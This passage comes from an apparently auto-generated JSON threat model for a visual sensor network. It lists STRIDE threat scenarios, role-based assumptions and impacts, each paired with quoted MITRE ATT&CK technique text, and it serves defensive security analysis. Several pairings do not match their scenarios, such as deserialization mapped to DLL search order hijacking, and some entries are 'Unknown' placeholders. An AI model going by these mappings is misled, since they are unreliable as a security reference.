                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed packets to the visual sensor network to overwhelm and disrupt the service.",
            "Assumptions": [
                {
                    "Assumption": "Network handling code does not properly validate packet structures.",
                    "Role": "Developer",
                    "Condition": "No rigorous input validation and error handling."
                },
                {
                    "Assumption": "System lacks mechanisms to detect and block malicious traffic.",
                    "Role": "System Admin",
                    "Condition": "No intrusion detection or rate limiting mechanisms."
                },
                {
                    "Assumption": "The attacker can generate a high volume of packets.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other mass-packet sending tools."
                }
            ],
            "Potential Impact": "Service disruption impacting data availability and system operations.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "Malformed Packets",
                "Service Disruption",
                "Network Flood"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker leverages an out-of-bounds write vulnerability in the visual sensor system's driver to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "Driver vulnerabilities are not patched.",
                    "Role": "System Admin",
                    "Condition": "Unpatched system vulnerabilities."
                },
                {
                    "Assumption": "No mechanisms to handle or mitigate driver failures.",
                    "Role": "Developer",
                    "Condition": "Lack of error handling in driver code."
                },
                {
                    "Assumption": "Attackers have knowledge of the vulnerable driver and exploit methods.",
                    "Role": "Attacker",
                    "Condition": "Publicly available exploit information."
                }
            ],
            "Potential Impact": "Potential service disruption and system crashes, impacting data and system availability.",
            "MITRE ATT&CK Keywords": [
                "Driver Vulnerability",
                "DoS",
                "System Crash",
                "Kernel Mode"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker continually requests large volumes of video streams from the visual sensor network, overwhelming server capacity.",
            "Assumptions": [
                {
                    "Assumption": "No limits on the number of requests from individual clients.",
                    "Role": "System Admin",
                    "Condition": "Rate limiting policies are absent."
                },
                {
                    "Assumption": "Insufficient bandwidth or server resources to handle high volume requests.",
                    "Role": "System Admin",
                    "Condition": "Resource allocation is inadequate."
                },
                {
                    "Assumption": "Attack can be sustained over a long period without triggering alerts.",
                    "Role": "Attacker",
                    "Condition": "No monitoring or anomaly detection for prolonged high traffic."
                }
            ],
            "Potential Impact": "Decreased system performance and possible server crashes, impacting data availability.",
            "MITRE ATT&CK Keywords": [
                "Resource Exhaustion",
                "DoS",
                "High Traffic",
                "Service Degradation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a deserialization vulnerability to execute arbitrary code with higher privileges on the visual sensor network.",
            "Assumptions": [
                {
                    "Assumption": "The system deserializes untrusted data without validation.",
                    "Role": "Developer",
                    "Condition": "Deserializer does not securely handle input."
                },
                {
                    "Assumption": "No protective measures against deserialization attacks.",
                    "Role": "System Admin",
                    "Condition": "Lack of security controls and input sanitization."
                },
                {
                    "Assumption": "Attackers can inject malicious data packets.",
                    "Role": "Attacker",
                    "Condition": "Network access permits crafted packet injection."
                }
            ],
            "Potential Impact": "Potential for unauthorized code execution and privilege escalation, impacting system integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "Deserialization",
                "Code Execution",
                "Privilege Escalation",
                "Serialized Data"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--46944654-fcc1-4f63-9dad-628102376586",
                "technique_id": "T1038"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a vulnerability in the kernel mode layer to escalate privileges and execute arbitrary code.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability in kernel mode code is unpatched.",
                    "Role": "System Admin",
                    "Condition": "System is not updated with recent patches."
                },
                {
                    "Assumption": "Attacker has initial access to the network.",
                    "Role": "Attacker",
                    "Condition": "Network access is insufficiently protected."
                },
                {
                    "Assumption": "No monitoring tools to detect privilege escalation activities.",
                    "Role": "System Admin",
                    "Condition": "Lack of security monitoring capabilities."
                }
            ],
            "Potential Impact": "Unauthorized actions with elevated privileges, impacting system integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Kernel Exploit",
                "Privilege Escalation",
                "Code Execution",
                "System Compromise"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker accesses MSRs (Model Specific Registers) via a compromised driver, leading to ring-0 code execution.",
            "Assumptions": [
                {
                    "Assumption": "MSR access is insufficiently secured.",
                    "Role": "System Admin",
                    "Condition": "No safeguards on MSR access."
                },
                {
                    "Assumption": "Exploitable driver installed on the system.",
                    "Role": "System Admin",
                    "Condition": "System is using a compromised or vulnerable driver."
                },
                {
                    "Assumption": "User access is not properly controlled or monitored.",
                    "Role": "System Admin",
                    "Condition": "Access control mechanisms are weak."
                }
            ],
            "Potential Impact": "Significant compromise of system integrity and security risks due to ring-0 level code execution.",
            "MITRE ATT&CK Keywords": [
                "MSR Access",
                "Privilege Escalation",
                "Ring-0 Execution",
                "Hardware Manipulation"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker can masquerade as an authorized camera node within the Visual Sensor Network (VSN) to send fake visual data.",
            "Assumptions": [
                {
                    "Assumption": "The network does not have strong authentication mechanisms for camera nodes.",
                    "Role": "System Administrator",
                    "Condition": "Without properly configured authentication measures."
                },
                {
                    "Assumption": "The attacker has network access to the VSN.",
                    "Role": "Attacker",
                    "Condition": "Gaining physical or network access."
                },
                {
                    "Assumption": "The VSN relies on IP addresses for node identification.",
                    "Role": "System Architect",
                    "Condition": "Using weak identification protocols."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual data and data tampering.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of a legitimate user attempting to access the VSN data.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no multi-factor authentication is used.",
                    "Role": "System Administrator",
                    "Condition": "Absent multi-factor authentication setup."
                },
                {
                    "Assumption": "The attacker has access to user credentials.",
                    "Role": "Attacker",
                    "Condition": "Through phishing or social engineering."
                },
                {
                    "Assumption": "The attacker is able to bypass network security controls.",
                    "Role": "Attacker",
                    "Condition": "Finding vulnerabilities in network defenses."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive visual data, leading to information disclosure.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "spoofing",
                "unauthorized access",
                "user"
            ],
            "mitre_technique": {
                "name": "System Owner/User Discovery",
                "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",
                "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
                "technique_id": "T1033"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker can spoof the identity of the admin interface to connect to the VSN management system.",
            "Assumptions": [
                {
                    "Assumption": "Weak admin interface protection mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient security measures for admin access."
                },
                {
                    "Assumption": "The attacker can manipulate the network traffic.",
                    "Role": "Attacker",
                    "Condition": "Possessing network control capabilities."
                },
                {
                    "Assumption": "Admin credentials are not securely stored or transmitted.",
                    "Role": "System Architect",
                    "Condition": "Insecure handling of credential data."
                }
            ],
            "Potential Impact": "Full administrative control over VSN, leading to data tampering and denial of service.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "credential access",
                "admin interface"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept and modify the transmitted visual data between camera nodes and central servers.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encryption on data-in-transit.",
                    "Role": "System Architect",
                    "Condition": "Data transmitted in plain text forms."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Compromising network infrastructure."
                },
                {
                    "Assumption": "The VSN does not use integrity checks on visual data.",
                    "Role": "System Developer",
                    "Condition": "No mechanisms to verify data integrity."
                }
            ],
            "Potential Impact": "Corruption or loss of visual data integrity, leading to misinformation.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "network",
                "tampering",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious firmware updates are distributed to camera nodes, leading to unauthorized code execution within the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not verified for authenticity.",
                    "Role": "System Administrator",
                    "Condition": "Lack of digital signature verification."
                },
                {
                    "Assumption": "The attacker has access to the firmware distribution channel.",
                    "Role": "Attacker",
                    "Condition": "Compromising the distribution system."
                },
                {
                    "Assumption": "Camera nodes automatically accept and install firmware updates.",
                    "Role": "System Developer",
                    "Condition": "Improper firmware update protocols."
                }
            ],
            "Potential Impact": "Unauthorized code execution leading to potential system-wide compromise.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "code injection",
                "device"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the central server to alter configuration files used by the camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Central server lacks sufficient access controls.",
                    "Role": "System Administrator",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "Configuration files are not checked for integrity.",
                    "Role": "System Developer",
                    "Condition": "No integrity verification mechanisms."
                },
                {
                    "Assumption": "The attacker has gained administrative privileges.",
                    "Role": "Attacker",
                    "Condition": "Exploiting a vulnerability to escalate privileges."
                }
            ],
            "Potential Impact": "Disruption in VSN functionality and potential data exposure or loss.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server",
                "configuration files",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider deletes visual data logs to cover unauthorized actions carried out within the network.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging mechanisms in place.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate log preservation policies."
                },
                {
                    "Assumption": "Lack of access control on log files.",
                    "Role": "System Developer",
                    "Condition": "Unrestricted access to log files."
                },
                {
                    "Assumption": "The attacker has insider access.",
                    "Role": "Attacker (Insider)",
                    "Condition": "Possessing valid insider credentials."
                }
            ],
            "Potential Impact": "Loss of audit trails, making it hard to trace and identify malicious activities.",
            "MITRE ATT&CK Keywords": [
                "log deletion",
                "inside attack",
                "repudiation",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker gains unauthorized access to erase visual evidence pertaining to criminal activity captured by the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on stored visual data.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate data protection policies."
                },
                {
                    "Assumption": "The attacker can manipulate logs and timestamp data.",
                    "Role": "Attacker",
                    "Condition": "Exploiting vulnerabilities in the logging system."
                },
                {
                    "Assumption": "No redundancy or backup mechanisms for captured data.",
                    "Role": "System Architect",
                    "Condition": "Absence of data backup strategies."
                }
            ],
            "Potential Impact": "Loss of crucial visual evidence, leading to potential legal ramifications.",
            "MITRE ATT&CK Keywords": [
                "data deletion",
                "repudiation",
                "visual evidence",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A remote attacker generates false activity reports by altering the log data of the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored and processed in an insecure environment.",
                    "Role": "System Administrator",
                    "Condition": "Insecure logging and processing systems."
                },
                {
                    "Assumption": "No audit trails or monitoring on log changes.",
                    "Role": "System Developer",
                    "Condition": "Absent or weak audit mechanisms."
                },
                {
                    "Assumption": "The attacker has write access to log storage.",
                    "Role": "Attacker",
                    "Condition": "Gaining access to log storage systems."
                }
            ],
            "Potential Impact": "Misleading activity reports and challenges in tracking actual events.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "activity reports",
                "repudiation",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits an XXE vulnerability in the VSN's XML data processing to exfiltrate sensitive visual data.",
            "Assumptions": [
                {
                    "Assumption": "The VSN processes XML data that is not properly sanitized.",
                    "Role": "System Developer",
                    "Condition": "Insufficient input validation."
                },
                {
                    "Assumption": "The attacker can submit malicious XML data.",
                    "Role": "Attacker",
                    "Condition": "Gaining access to data submission interfaces."
                },
                {
                    "Assumption": "The VSN does not enforce robust security policies for XML parsing.",
                    "Role": "System Architect",
                    "Condition": "Weak security policy enforcement."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "XXE",
                "data exfiltration",
                "information disclosure",
